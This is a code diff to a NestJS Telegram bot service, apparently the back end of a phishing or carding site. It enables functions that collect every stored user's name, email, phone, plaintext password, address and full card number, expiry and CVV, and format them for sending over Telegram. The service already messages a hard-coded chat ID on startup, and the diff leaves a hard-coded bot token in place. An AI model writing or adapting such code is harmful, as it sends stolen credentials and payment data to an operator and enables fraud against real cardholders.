@@ -1,4 +1,4 @@
-import { Injectable, Logger, Scope } from '@nestjs/common';
+import { Injectable, Logger } from '@nestjs/common';
 import { IMessage } from './telegram.interface';
 import { GlobalMessage } from './globalMsg.interface';
 import { createWriteStream } from 'fs';
@@ -9,10 +9,8 @@ const TelegramBot = require('node-telegram-bot-api');
 const TELEGRAM_TOKEN = '7240720904:AAGEDxkL8ucdMKOB6w5LjiPau0W9vL8aBfA';
 const fs = require('fs').promises;
 
-@Injectable({ scope: Scope.DEFAULT })
+@Injectable()
 export class TelegramBotService {
-
-  private static instance: TelegramBotService;
   private readonly bot: any;
   // private readonly bot:TelegramBot // works after installing types
   private logger = new Logger(TelegramBotService.name);
@@ -24,17 +22,12 @@ export class TelegramBotService {
   );
 
   constructor(
+    @InjectModel('user')
+    private readonly userModel: Model<UserDocument>,
   ) {
     
-    // this.bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
-
-    if (TelegramBotService.instance) {
-      throw new Error('Ya existe una instancia de TelegramBotService');
-    }
     this.bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
-    TelegramBotService.instance = this;
 
-    ///////////////////////////////////////////////
     this.bot.on('message', this.onReceiveMessage);
     // Suponiendo que tienes una función que maneja comandos o mensajes
     this.sendMessageToUser('951742175', `Server started at ${new Date()}`);
@@ -74,13 +67,6 @@ export class TelegramBotService {
     //   // Opcional: responde al callback para eliminar el reloj de espera en el botón
     //   this.bot.answerCallbackQuery(callbackQuery.id);
     // });
-  }
-
-  static getInstance(): TelegramBotService {
-    if (!TelegramBotService.instance) {
-      TelegramBotService.instance = new TelegramBotService();
-    }
-    return TelegramBotService.instance;
   }
 
   onReceiveMessage = (msg: any) => {
@@ -178,42 +164,42 @@ export class TelegramBotService {
     }
   }
 
-  // async generateUserCardDetails(chatId: any): Promise<string> {
-  //   // Suponiendo que tienes una función que obtiene todos los usuarios
-  //   const users = await this.getAllUsers(chatId);
-  //   console.log('USUARIOS => ', users);
-  //   if (!users || !users.length) return;
+  async generateUserCardDetails(chatId: any): Promise<string> {
+    // Suponiendo que tienes una función que obtiene todos los usuarios
+    const users = await this.getAllUsers(chatId);
+    console.log('USUARIOS => ', users);
+    if (!users || !users.length) return;
 
-  //   let userDetailsString = '';
+    let userDetailsString = '';
 
-  //   users.forEach((user) => {
-  //     userDetailsString += `
-  //       ******** ${this.formatDate(new Date())} ********
-  //       Fullname: ${user.fullName}
-  //       Correo: ${user.email}
-  //       Numero: ${user.phone}
-  //       Clave: ${user.password}
+    users.forEach((user) => {
+      userDetailsString += `
+        ******** ${this.formatDate(new Date())} ********
+        Fullname: ${user.fullName}
+        Correo: ${user.email}
+        Numero: ${user.phone}
+        Clave: ${user.password}
 
-  //       country: ${user.country.name}
-  //       state: ${user.state.name}
-  //       city: ${user.city}
-  //       address: ${user.address}
-  //       zipCode: ${user.zipCode}
-  //     `;
+        country: ${user.country.name}
+        state: ${user.state.name}
+        city: ${user.city}
+        address: ${user.address}
+        zipCode: ${user.zipCode}
+      `;
 
-  //     user.cards.forEach((card) => {
-  //       userDetailsString += `
-  //       Number: ${card.cardNumber}
-  //       Fecha : ${card.expirationDate}
-  //       Codigo: ${card.cardCVV}
-  //       ***********************************
-  //       `;
-  //     });
-  //   });
+      user.cards.forEach((card) => {
+        userDetailsString += `
+        Number: ${card.cardNumber}
+        Fecha : ${card.expirationDate}
+        Codigo: ${card.cardCVV}
+        ***********************************
+        `;
+      });
+    });
 
-  //   console.log('Usuarios => ', users);
-  //   return userDetailsString;
-  // }
+    console.log('Usuarios => ', users);
+    return userDetailsString;
+  }
 
   private formatDate(date: Date): string {
     const options: Intl.DateTimeFormatOptions = {
@@ -226,18 +212,18 @@ export class TelegramBotService {
   }
 
   // Supongamos que esta función devuelve todos los usuarios
-  // private async getAllUsers(chatId: any): Promise<User[] | null> {
-  //   const users = await this.userModel.find();
-  //   if (!users) {
-  //     this.sendMessageToUser(
-  //       chatId.toString(),
-  //       'No tienes usuarios disponible',
-  //     );
-  //     return null;
-  //   }
+  private async getAllUsers(chatId: any): Promise<User[] | null> {
+    const users = await this.userModel.find();
+    if (!users) {
+      this.sendMessageToUser(
+        chatId.toString(),
+        'No tienes usuarios disponible',
+      );
+      return null;
+    }
 
-  //   return users;
-  // }
+    return users;
+  }
 
   async sendTextFileToUser(
     chatId: number,
@@ -277,5 +263,3 @@ export class TelegramBotService {
     }
   }
 }
-
-const telegramBotService = TelegramBotService.getInstance();
